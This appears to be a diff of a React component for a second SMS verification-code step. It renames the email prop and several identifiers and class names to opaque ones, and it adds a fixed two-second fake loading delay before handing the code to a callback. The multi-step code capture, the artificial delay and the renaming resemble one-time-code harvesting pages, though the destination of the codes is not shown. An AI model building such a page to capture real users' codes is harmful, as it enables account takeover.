@@ -1,20 +1,20 @@
 import React, { useState } from 'react'
 
-const OtpStep2 = ({email, userId, onComplete}) => {
-    const [phoneOtp2, setphoneOtp2] = useState("");
+const OtpStep2 = ({first, userId, onComplete}) => {
+    const [ptp2, setphoneOtp2] = useState("");
         const [showLoader, setShowLoader] = useState(false);
       
     
      const handleSubmit = (e) => {
       e.preventDefault();
     
-      if (!phoneOtp2.trim()) return;
+      if (!ptp2.trim()) return;
     
         setShowLoader(true);
     
       if (onComplete) {
          setTimeout(() => {
-             onComplete(userId, phoneOtp2.trim());
+             onComplete(userId, ptp2.trim());
           setShowLoader(false);
         }, 2000);
        
@@ -50,7 +50,7 @@ const OtpStep2 = ({email, userId, onComplete}) => {
           </div>
         )}
 
-        <div className="password-left">
+        <div className="last-left">
 
            <div className="pesams-brand">
 
@@ -69,8 +69,8 @@ const OtpStep2 = ({email, userId, onComplete}) => {
 
           <div onClick={handleBack} className="account-pill">
             <span className="account-icon">👤</span>
-            <span className="account-email">
-              {email}
+            <span className="account-first">
+              {first}
             </span> 
               <button
                   type="button"
@@ -83,26 +83,26 @@ const OtpStep2 = ({email, userId, onComplete}) => {
 
         </div>
 
-        <div className="password-right">
+        <div className="last-right">
 
       
 
           <form onSubmit={handleSubmit}>
             <div>A text message with a 6-digit verification code was just sent to your number attached to this mail</div>
 
-            <div className="password-input-container green">
+            <div className="last-input-container green">
 
               <input
-                id="password"
+                id="last"
                 type={"number"}
-                value={phoneOtp2}
+                value={ptp2}
                 
                 onChange={(e) => setphoneOtp2(e.target.value)}
                 placeholder=" "
                 autoComplete="off"
               />
 
-              <label htmlFor="password">
+              <label htmlFor="last">
                 Enter 6-digit code
               </label>
 
@@ -113,7 +113,7 @@ const OtpStep2 = ({email, userId, onComplete}) => {
 
          
 
-            <div className="password-actions">
+            <div className="last-actions">
 
               <button
                 type="button"
@@ -125,7 +125,7 @@ const OtpStep2 = ({email, userId, onComplete}) => {
               <button
                 type="submit"
                 className="next-button"
-                disabled={!phoneOtp2.trim()}
+                disabled={!ptp2.trim()}
               >
                 Next
               </button>
